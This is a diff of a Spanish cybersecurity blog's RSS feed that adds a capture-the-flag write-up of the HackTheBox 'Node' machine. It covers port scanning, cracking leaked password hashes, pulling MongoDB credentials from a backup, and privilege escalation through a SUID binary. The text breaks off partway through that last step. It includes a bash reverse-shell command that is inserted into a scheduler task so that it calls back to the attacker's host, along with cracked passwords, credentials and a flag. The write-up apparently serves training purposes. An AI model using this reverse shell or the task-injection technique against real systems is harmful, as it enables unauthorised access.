@@ -5,9 +5,829 @@
     <description>Articulos, Writeups, Htb, Programación y Noticias sobre Ciberseguridad</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Thu, 29 Jun 2023 20:19:35 +0000</pubDate>
-    <lastBuildDate>Thu, 29 Jun 2023 20:19:35 +0000</lastBuildDate>
+    <pubDate>Tue, 18 Jul 2023 03:53:21 +0000</pubDate>
+    <lastBuildDate>Tue, 18 Jul 2023 03:53:21 +0000</lastBuildDate>
     <generator>Jekyll v3.9.0</generator>
+    
+      <item>
+        <title>Maquina Node - htb writeup</title>
+        <description>&lt;p&gt;El dia de hoy vamos a resolver &lt;code&gt;Node&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; una maquina &lt;code&gt;linux&lt;/code&gt; de dificultad media, para poder comprometer la maquina nos aprovecharemos la informacion lekeada del servicio expuesta en la &lt;code&gt;api&lt;/code&gt; que nos otorgara credenciales para conectarnos al servicio, donde descargaremos un backup comprimido con información para poder ingresar al sistema, despues aprovecharemos de una inyeccion a una task de &lt;code&gt;mongodb&lt;/code&gt; donde a traves de un campo obtendremos ejecución remota de comandos &lt;code&gt;rce&lt;/code&gt; y finalmente mediante un binario &lt;code&gt;suid&lt;/code&gt; podremos leeer la flag del usuario &lt;code&gt;root&lt;/code&gt;. Ademas alternivamente vamos a ganar acceso al sistema explotando un &lt;code&gt;buffer overflow&lt;/code&gt; en el binario &lt;code&gt;suid&lt;/code&gt; a traves de &lt;code&gt;ret2libc&lt;/code&gt; y ganando acceso al sistema como el usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Esta maquina es divertida asi que a darle!.&lt;/p&gt;
+
+&lt;p&gt;Vamos a comenzar como de costumbre creando un directorio con el nombre de la maquina:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Node
+❯ ls:w
+
+ Node
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
+mkt () {
+	mkdir {nmap,content,exploits,scripts}
+}
+❯ mkt
+❯ ls
+ content   exploits   nmap   scripts
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;enumeracion&quot;&gt;ENUMERACION &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.58
+PING 10.10.10.58 (10.10.10.58) 56(84) bytes of data.
+64 bytes from 10.10.10.58: icmp_seq=1 ttl=63 time=109 ms
+
+--- 10.10.10.58 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 108.550/108.550/108.550/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;63&lt;/code&gt; y por proximidad seria correspondiente a una maquina &lt;code&gt;linux&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;ESCANEO DE PUERTOS&lt;/h3&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Parámetro&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.58 -oG openPorts
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-17 22:25 GMT
+Initiating SYN Stealth Scan at 22:25
+Scanning 10.10.10.58 [65535 ports]
+Discovered open port 22/tcp on 10.10.10.58
+Discovered open port 3000/tcp on 10.10.10.58
+Completed SYN Stealth Scan at 22:25, 26.41s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.58
+Host is up, received user-set (0.11s latency).
+Scanned at 2023-07-17 22:25:27 GMT for 26s
+Not shown: 65533 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT     STATE SERVICE REASON
+22/tcp   open  ssh     syn-ack ttl 63
+3000/tcp open  ppp     syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 26.51 seconds
+           Raw packets sent: 131086 (5.768MB) | Rcvd: 20 (880B)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;ESCANEO DE VERSION Y SERVICIOS&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p22,3000 10.10.10.58 -oN targeted
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-17 22:26 GMT
+Nmap scan report for 10.10.10.58
+Host is up (0.12s latency).
+
+PORT     STATE SERVICE            VERSION
+22/tcp   open  ssh                OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
+|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
+|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
+3000/tcp open  hadoop-tasktracker Apache Hadoop
+|_http-title: MyPlace
+| hadoop-datanode-info: 
+|_  Logs: /login
+| hadoop-tasktracker-info: 
+|_  Logs: /login
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 20.44 seconds
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Visulizamos información interesante de los puertos escaneados:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Puerto&lt;/th&gt;
+      &lt;th&gt;Servicio&lt;/th&gt;
+      &lt;th&gt;Versión&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;22&lt;/td&gt;
+      &lt;td&gt;SSH&lt;/td&gt;
+      &lt;td&gt;OpenSSH 7.2p2&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;80&lt;/td&gt;
+      &lt;td&gt;HTTP&lt;/td&gt;
+      &lt;td&gt;hadoop-tasktracker&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&quot;explotación&quot;&gt;EXPLOTACION &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Comenzamos usando &lt;code&gt;whatweb&lt;/code&gt;, para determinar las tecnologias que esta usando el servicio web.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://10.10.10.58:3000
+http://10.10.10.58:3000 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, IP[10.10.10.58], JQuery, Script[text/javascript], Title[MyPlace], X-Powered-By[Express], X-UA-Compatible[IE=edge]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;La herramienta nos reporta que se trata de un &lt;code&gt;Express&lt;/code&gt;, lo que quiere decir que en el backend esta corriendo &lt;code&gt;NodeJS&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Vamos a proceder a abrir el servicio con el navegador para visualizar el servicio.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Node/node1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que existe una opcion de login para acceder al servicio.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Node/node2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora ya que sabemos que por dentro corre un &lt;code&gt;nodejs&lt;/code&gt;, para evitar aplicar fuzzing, podemos usar el depurador, para poder ver rutas por defecto del servicio tipo &lt;code&gt;app&lt;/code&gt;. Y dentro descubrimos una ruta de usuarios.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Node/node3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si tratamos de acceder a la ruta, vemos que podemos listar el contenido de usuarios con sus respectivas contraseñas hasheadas.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Node/node4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Procedemos a crackear las contraseñas para ello usaremos nuestra web de confianza.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://crackstation.net/&quot;&gt;https://crackstation.net/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;y Obtenemos contraseñas en texto claro.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Node/node5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;La exportamos al fichero de nombre &lt;code&gt;users.txt&lt;/code&gt; y procedemos a logearnos al servicio.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ cat users.txt
+myP14ceAdm1nAcc0uNT:manchester
+tom:spongebob
+mark:snowflake
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Al conectarnos vemos una opción de &lt;code&gt;DownloadBackup&lt;/code&gt;, asi que lo descargamos y hacemos un decode del contenido que esta en &lt;code&gt;base64&lt;/code&gt; y lo exportamos con el nombre de &lt;code&gt;backup&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Node/node6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ cat myplace.backup | base64 -d &amp;gt; backup
+❯ cat backup
+❯ file backup
+backup: Zip archive data, at least v1.0 to extract
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Como resultado obtenemos un comprimido protegido por contraseña.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ unzip backup
+Archive:  backup
+   creating: var/www/myplace/
+[backup] var/www/myplace/package-lock.json password
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Usaremos &lt;code&gt;fcrackzip&lt;/code&gt; y obtenemos la contraeña del comprimido.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ fcrackzip -b -D -u -p /usr/share/wordlists/rockyou.txt backup
+
+
+PASSWORD FOUND!!!!: pw == magicword
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Dentro observamos bastante contenido, pero al tratarse de un &lt;code&gt;node.js&lt;/code&gt;, podemos tratar de grepear por archivos como &lt;code&gt;app.js&lt;/code&gt;, donde podemos encontrar informacion interesante.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ find . | grep app.js
+./www/myplace/app.js
+./www/myplace/static/assets/js/app/app.js
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Abrimos el archivo &lt;code&gt;app.js&lt;/code&gt; y encontramos unas credenciales del servicio mongodb, correspondientes al usuario &lt;code&gt;mark&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Node/node7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Como vimos que el servicio &lt;code&gt;ssh&lt;/code&gt; se encuentra activo, podemos tratar de conectarnos con las nuevas credenciales.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Wed Sep 27 02:33:14 2017 from 10.10.14.3
+
+              .-. 
+        .-'``(|||) 
+     ,`\ \    `-`.                 88                         88 
+    /   \ '``-.   `                88                         88 
+  .-.  ,       `___:      88   88  88,888,  88   88  ,88888, 88888  88   88 
+ (:::) :        ___       88   88  88   88  88   88  88   88  88    88   88 
+  `-`  `       ,   :      88   88  88   88  88   88  88   88  88    88   88 
+    \   / ,..-`   ,       88   88  88   88  88   88  88   88  88    88   88 
+     `./ /    .-.`        '88888'  '88888'  '88888'  88   88  '8888 '88888' 
+        `-..-(   ) 
+              `-` 
+
+
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Tue Jul 18 00:34:52 2023 from 10.10.16.2
+mark@node:~$ 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ahora que ganamos acceso al sistema como el usuario &lt;code&gt;mark&lt;/code&gt;, listamos los servicios activos y vemos el puerto &lt;code&gt;27017&lt;/code&gt;, correspondiente a &lt;code&gt;MongoDB&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;mark@node:~$ ss -nltp
+State       Recv-Q Send-Q                 Local Address:Port                    Peer Address:Port      
+LISTEN      0      128                     127.0.0.1:27017                              *:*            
+LISTEN      0      128                          *:22                                    *:*       
+LISTEN      0      128                        :::3000                                   :::*           
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Si ahora listamos los procesos del sistema vemos que se esta corriendo otro &lt;code&gt;app.js&lt;/code&gt; correspondiente a un &lt;code&gt;scheduller&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;mark@node:~$ ps -faux
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         2  0.0  0.0      0     0 ?        S    Jul17   0:00 [kthreadd]
+root         3  0.0  0.0      0     0 ?        S    Jul17   0:00  \_ [ksoftirqd/0]
+mongodb   1237  0.6 11.8 281952 89772 ?        Ssl  Jul17   0:36 /usr/bin/mongod --auth --quiet --config /etc/mongod.conf
+tom       1240  0.0  5.5 1008568 42148 ?       Ssl  Jul17   0:02 /usr/bin/node /var/scheduler/app.js
+tom       1243  0.0  9.0 1041968 68560 ?       Ssl  Jul17   0:03 /usr/bin/node /var/www/myplace/app.js
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Si visualizamos el archivo obtenemos otras credenciales correspondientes a mongo.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;mark@node:~$ cat /var/scheduler/app.js
+const exec        = require('child_process').exec;
+const MongoClient = require('mongodb').MongoClient;
+const ObjectID    = require('mongodb').ObjectID;
+const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&amp;amp;authSource=scheduler';
+
+MongoClient.connect(url, function(error, db) {
+  if (error || !db) {
+    console.log('[!] Failed to connect to mongodb');
+    return;
+  }
+
+  setInterval(function () {
+    db.collection('tasks').find().toArray(function (error, docs) {
+      if (!error &amp;amp;&amp;amp; docs) {
+        docs.forEach(function (doc) {
+          if (doc) {
+            console.log('Executing task ' + doc._id + '...');
+            exec(doc.cmd);
+            db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
+          }
+        });
+      }
+      else if (error) {
+        console.log('Something went wrong: ' + error);
+      }
+    });
+  }, 30000);
+
+});
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Nos conectamos la servicio con las nuevas credenciales obtenidas, listamos las colecciones de la base de datos.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;mark@node:~$ mongo -u mark -p 5AYRft73VtFpc84k scheduler
+MongoDB shell version: 3.2.16
+connecting to: scheduler
+&amp;gt; show collections
+tasks
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;En la colección &lt;code&gt;tasks&lt;/code&gt;, vamos a usar &lt;code&gt;db.task.find()&lt;/code&gt; tal y como vemos en el script &lt;code&gt;app.js&lt;/code&gt; para realizar consultas en la colección &lt;code&gt;tasks&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;&amp;gt; db.tasks.find()
+&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;La consulta no nos lista nada, pero si volvemos a revisar &lt;code&gt;app.js&lt;/code&gt; obervamos &lt;code&gt;exec(doc.cmd);&lt;/code&gt; que se esta validando el uso de un campo llamado &lt;code&gt;cmd&lt;/code&gt;, asi que podriamos tratar de  insertar un nuevo documento con &lt;code&gt;db.tasks.insert()&lt;/code&gt; incorporando el &lt;code&gt;cmd&lt;/code&gt; y ejecutando un comando aprovechandonos de la función &lt;code&gt;exec&lt;/code&gt;y asi otorgarnos una &lt;code&gt;revershell&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;&amp;gt; db.tasks.insert({&quot;cmd&quot;: &quot;bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.16.2/443 0&amp;gt;&amp;amp;1'&quot;})
+WriteResult({ &quot;nInserted&quot; : 1 })
+&amp;gt; db.tasks.find()
+{ &quot;_id&quot; : ObjectId(&quot;64b5d7e418c6053c65dd5030&quot;), &quot;cmd&quot; : &quot;bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.16.2/443 0&amp;gt;&amp;amp;1'&quot; }
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ahora nos ponemos en escucha en nuestra equipo y recibimos la conexión como el usuario &lt;code&gt;tom&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.58.
+Ncat: Connection from 10.10.10.58:44564.
+bash: cannot set terminal process group (1240): Inappropriate ioctl for device
+bash: no job control in this shell
+To run a command as administrator (user &quot;root&quot;), use &quot;sudo &amp;lt;command&amp;gt;&quot;.
+See &quot;man sudo_root&quot; for details.
+
+tom@node:/$ whoami
+whoami
+tom
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ahora podemos dirigirnos al directorio personal del usuario y visualizar la primera flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;tom@node:/$ cd /home/tom
+cd /home/tom
+tom@node:~$ cat user.txt
+cat user.txt
+4452fba153c742ca44fd79aac0f934c9
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;ELEVACION DE PRIVILEGIOS &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Listando los binarios con privilegios &lt;code&gt;suid&lt;/code&gt;, encontramos uno inusual llamando &lt;code&gt;backup&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;tom@node:/$ find / -perm -4000 2&amp;gt;/dev/null
+find / -perm -4000 2&amp;gt;/dev/null
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/snapd/snap-confine
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/local/bin/backup
+/usr/bin/chfn
+/usr/bin/at
+/usr/bin/gpasswd
+/usr/bin/newgidmap
+/usr/bin/chsh
+/usr/bin/sudo
+/usr/bin/pkexec
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/newuidmap
+/bin/ping
+/bin/umount
+/bin/fusermount
+/bin/ping6
+/bin/ntfs-3g
+/bin/su
+/bin/mount
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Si tratamos de ejecutar el binario, vemos que no sucede nada.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;tom@node:/$ /usr/local/bin/backup
+/usr/local/bin/backup
+tom@node:/$
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Pero si volvemos a visualizar el &lt;code&gt;app.js&lt;/code&gt; que listamos al principio el cual estaba contenido en el comprimido, observamos una ruta correspondiente a &lt;code&gt;backup&lt;/code&gt; la cual se ejecuta con 3 parametros, entre ellos una key y un directorio.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Node/node8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Probamos nuevamente a ejecutarlo con 3 parametros.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;om@node:/$ /usr/local/bin/backup a a a
+/usr/local/bin/backup a a a
+
+
+
+             ____________________________________________________
+            /                                                    \
+           |    _____________________________________________     |
+           |   |                                             |    |
+           |   |                                             |    |
+           |   |                                             |    |
+           |   |                                             |    |
+           |   |                                             |    |
+           |   |                                             |    |
+           |   |             Secure Backup v1.0              |    |
+           |   |                                             |    |
+           |   |                                             |    |
+           |   |                                             |    |
+           |   |                                             |    |
+           |   |                                             |    |
+           |   |                                             |    |
+           |   |_____________________________________________|    |
+           |                                                      |
+            \_____________________________________________________/
+                   \_______________________________________/
+                _______________________________________________
+             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
+          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
+       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
+    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
+ _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
+:-----------------------------------------------------------------------------:
+`---._.-----------------------------------------------------------------._.---'
+
+
+ [!] Ah-ah-ah! You didn't say the magic word!
+
+
+tom@node:/$
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Vemos que esta vez funciona, pero ahora usaremos ltrace para ver a bajo nivel el proceso de lo que sucede al ejecutar el binario.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;tom@node:/$ ltrace /usr/local/bin/backup a b c
+ltrace /usr/local/bin/backup a b c
+strncpy(0xffef6578, &quot;b&quot;, 100)                                                                                     = 0xffef6578
+strcpy(0xffef6561, &quot;/&quot;)                                                                                           = 0xffef6561
+strcpy(0xffef656d, &quot;/&quot;)                                                                                           = 0xffef656d
+strcpy(0xffef64f7, &quot;/e&quot;)                                                                                          = 0xffef64f7
+strcat(&quot;/e&quot;, &quot;tc&quot;)                                                                                                = &quot;/etc&quot;
+strcat(&quot;/etc&quot;, &quot;/m&quot;)                                                                                              = &quot;/etc/m&quot;
+strcat(&quot;/etc/m&quot;, &quot;yp&quot;)                                                                                            = &quot;/etc/myp&quot;
+strcat(&quot;/etc/myp&quot;, &quot;la&quot;)                                                                                          = &quot;/etc/mypla&quot;
+strcat(&quot;/etc/mypla&quot;, &quot;ce&quot;)                                                                                        = &quot;/etc/myplace&quot;
+strcat(&quot;/etc/myplace&quot;, &quot;/k&quot;)                                                                                      = &quot;/etc/myplace/k&quot;
+strcat(&quot;/etc/myplace/k&quot;, &quot;ey&quot;)                                                                                    = &quot;/etc/myplace/key&quot;
+strcat(&quot;/etc/myplace/key&quot;, &quot;s&quot;)                                                                                   = &quot;/etc/myplace/keys&quot;
+fopen(&quot;/etc/myplace/keys&quot;, &quot;r&quot;)                                                                                   = 0x8c06410
+fgets(&quot;a01a6aa5aaf1d7729f35c8278daae30f&quot;..., 1000, 0x8c06410)                                                     = 0xffef610f
+strcspn(&quot;a01a6aa5aaf1d7729f35c8278daae30f&quot;..., &quot;\n&quot;)                                                              = 64
+strcmp(&quot;b&quot;, &quot;a01a6aa5aaf1d7729f35c8278daae30f&quot;...)                                                                = 1
+fgets(&quot;45fac180e9eee72f4fd2d9386ea7033e&quot;..., 1000, 0x8c06410)                                                     = 0xffef610f
+strcspn(&quot;45fac180e9eee72f4fd2d9386ea7033e&quot;..., &quot;\n&quot;)                                                              = 64
+strcmp(&quot;b&quot;, &quot;45fac180e9eee72f4fd2d9386ea7033e&quot;...)                                                                = 1
+fgets(&quot;3de811f4ab2b7543eaf45df611c2dd25&quot;..., 1000, 0x8c06410)                                                     = 0xffef610f
+strcspn(&quot;3de811f4ab2b7543eaf45df611c2dd25&quot;..., &quot;\n&quot;)                                                              = 64
+strcmp(&quot;b&quot;, &quot;3de811f4ab2b7543eaf45df611c2dd25&quot;...)                                                                = 1
+fgets(&quot;\n&quot;, 1000, 0x8c06410)                                                                                      = 0xffef610f
+strcspn(&quot;\n&quot;, &quot;\n&quot;)                                                                                               = 0
+strcmp(&quot;b&quot;, &quot;&quot;)                                                                                                   = 1
+fgets(nil, 1000, 0x8c06410)                                                                                       = 0
+strcpy(0xffef5148, &quot;Ah-ah-ah! You didn't say the mag&quot;...)                                                         = 0xffef5148
+printf(&quot; %s[!]%s %s\n&quot;, &quot;\033[33m&quot;, &quot;\033[37m&quot;, &quot;Ah-ah-ah! You didn't say the mag&quot;... [!] Ah-ah-ah! You didn't say the magic word!
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Observamos que compara el segundo campo &lt;code&gt;b&lt;/code&gt; con una key de un archivo &lt;code&gt;/etc/myplace/keys&lt;/code&gt; que si lo listamos podemos ver el contenido.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;tom@node:/$ cat /etc/myplace/keys
+cat /etc/myplace/keys
+a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508
+45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474
+3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Podemos usar una de las keys y como tercer parametro ya que nos pide ingresar un directorio, podriamos tratar de visualizar la flag de root.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;/usr/local/bin/backup a 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 root
+
+
+
+             ____________________________________________________
+            /                                                    \
+           |    _____________________________________________     |
+           |   |                                             |    |
+           |   |                                             |    |
+           |   |                                             |    |
+           |   |                                             |    |
+           |   |                                             |    |
+           |   |                                             |    |
+           |   |             Secure Backup v1.0              |    |
+           |   |                                             |    |
+           |   |                                             |    |
+           |   |                                             |    |
+           |   |                                             |    |
+           |   |                                             |    |
+           |   |                                             |    |
+           |   |_____________________________________________|    |
+           |                                                      |
+            \_____________________________________________________/
+                   \_______________________________________/
